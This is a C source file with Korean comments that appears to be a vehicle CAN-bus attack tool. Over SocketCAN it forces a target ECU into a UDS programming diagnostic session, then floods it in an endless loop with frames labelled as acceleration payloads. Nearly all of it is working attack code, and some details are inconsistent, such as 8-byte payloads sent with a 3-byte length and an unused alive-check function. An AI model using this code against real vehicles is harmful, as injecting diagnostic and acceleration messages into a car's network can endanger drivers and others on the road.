#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#define RX_CANID_OFFSET 0x008
#define ECU_ATTACK_SLEEP_TIME 100000 // 100ms in microseconds
#define ECU_CHECK_SLEEP_TIME 100000  // 100ms in microseconds
#define PAYLOAD_SIZE 3
#define MAX_CANIDS 100 // 예시값

// payloads array
unsigned char checkecupayload[3] = {0x02, 0x3e, 0x00};
unsigned char resetpayload1[3] = {0x02, 0x10, 0x02};
unsigned char resetpayload2[3] = {0x02, 0x11, 0x01};
unsigned char accelpayload1[8] = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12};
unsigned char accelpayload2[8] = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12};

// 전역 변수 선언 (필요 시)
int sock_fd;
struct sockaddr_can addr_can;
struct can_frame rx_frame;
int num_canids = 0; // 실제 CAN ID 수에 맞게 설정

// send_can_frame 함수 수정
void send_can_frame(int s, struct can_frame *frame) {
    if (write(s, frame, sizeof(struct can_frame)) != sizeof(struct can_frame)) {
        perror("Write");
        // 소켓을 닫고 프로그램 종료
        close(s);
        exit(EXIT_FAILURE);
    }
}

// ECU 공격 시작 함수 수정
int ecu_attack_start(int ECUcan_id){
    struct can_frame frame;
    struct timespec start, current;
    while(1){
        frame.can_id = ECUcan_id;
        frame.can_dlc = PAYLOAD_SIZE;
        memcpy(frame.data, resetpayload1, PAYLOAD_SIZE);
        send_can_frame(sock_fd, &frame);

        clock_gettime(CLOCK_MONOTONIC, &start);
        int response_found = 0;  // 응답이 발견되었는지 여부를 표시하는 플래그
        while (1) {
            int nbytes = read(sock_fd, &rx_frame, sizeof(struct can_frame));
            if (nbytes > 0) {
                // 응답 CAN ID 및 데이터 확인
                if (rx_frame.can_id == (ECUcan_id + RX_CANID_OFFSET) &&
                    rx_frame.can_dlc == PAYLOAD_SIZE &&
                    rx_frame.data[0] == 0x02 &&
                    rx_frame.data[1] == 0x50 &&
                    rx_frame.data[2] == 0x02) {
                    response_found = 1;
                    break;
                }
            }

            clock_gettime(CLOCK_MONOTONIC, &current);
            long elapsed_us = (current.tv_sec - start.tv_sec) * 1000000L + 
                              (current.tv_nsec - start.tv_nsec) / 1000L;
            if (elapsed_us >= ECU_ATTACK_SLEEP_TIME) {
                break;
            }
        }

        if (response_found) {
            return 1;
        }

        // 응답이 없으면 계속 시도
    }
}

// ECU 상태 확인 함수 수정
int ecu_check_alive(int ECUcan_id){
    struct can_frame frame;
    struct timespec start, current;
    while(1){
        frame.can_id = ECUcan_id;
        frame.can_dlc = PAYLOAD_SIZE;
        memcpy(frame.data, checkecupayload, PAYLOAD_SIZE);
        send_can_frame(sock_fd, &frame);

        clock_gettime(CLOCK_MONOTONIC, &start);
        int response_found = 0;
        while (1) {
            int nbytes = read(sock_fd, &rx_frame, sizeof(struct can_frame));
            if (nbytes > 0) {
                if (rx_frame.can_id == (ECUcan_id + RX_CANID_OFFSET) &&
                    rx_frame.can_dlc == PAYLOAD_SIZE &&
                    rx_frame.data[0] == 0x02 &&
                    rx_frame.data[1] == 0x50 &&
                    rx_frame.data[2] == 0x02) {
                    response_found = 1;
                    break;
                }
            }

            clock_gettime(CLOCK_MONOTONIC, &current);
            long elapsed_us = (current.tv_sec - start.tv_sec) * 1000000L + 
                              (current.tv_nsec - start.tv_nsec) / 1000L;
            if (elapsed_us >= ECU_CHECK_SLEEP_TIME) {
                break;
            }
        }

        if (response_found) {
            return 1;
        }

        // 응답이 없으면 계속 시도
    }
}

// ECU 공격 함수 수정
void ecu_msq_attack(int ECUcan_id){
    struct can_frame frame;

    // 첫 번째 페이로드 전송
    frame.can_id = ECUcan_id;
    frame.can_dlc = 3;
    memcpy(frame.data, accelpayload1, 3);
    send_can_frame(sock_fd, &frame);
    
    // 두 번째 페이로드 전송 (나머지 데이터는 0으로 초기화)
    frame.can_id = ECUcan_id;
    frame.can_dlc = 3;
    memset(frame.data, 0, sizeof(frame.data));
    memcpy(frame.data, accelpayload2, 2);
    send_can_frame(sock_fd, &frame);
}

int main(int argc, char*argv[]) {
    if (argc != 5 || strcmp(argv[3], "-diff") != 0) {
        printf("Usage: %s [can_interface] [ECUcanid] -diff [time_interval]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *interface = argv[1];
    int ECUcan_id = (int)strtol(argv[2], NULL, 16);
    int interval = atoi (argv[4]);

    struct ifreq ifr;
    struct can_frame frame;

    // CAN 소켓 생성
    if ((sock_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0){
        perror("Socket fail");
        return EXIT_FAILURE;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';
    if (ioctl(sock_fd, SIOCGIFINDEX, &ifr) < 0){
        perror("ioctl");
        close(sock_fd);
        return EXIT_FAILURE;
    }

    addr_can.can_family = AF_CAN;
    addr_can.can_ifindex = ifr.ifr_ifindex;

    if (bind(sock_fd, (struct sockaddr *)&addr_can, sizeof(addr_can)) < 0){
        perror("Bind fail");
        close(sock_fd);
        return EXIT_FAILURE;
    }

    // ECU 공격 시작
    if (ecu_attack_start(ECUcan_id)) {
        printf("ECU is ready for diagnostic mode.\n");
    }

    // ECU 공격 루프
    while(1) {
        ecu_msq_attack(ECUcan_id);
        usleep(interval * 1000); // 밀리초 단위
    }

    // 소켓 닫기 (실제로는 종료 시에 닫아야 함)
    close(sock_fd);
    return EXIT_SUCCESS;
}
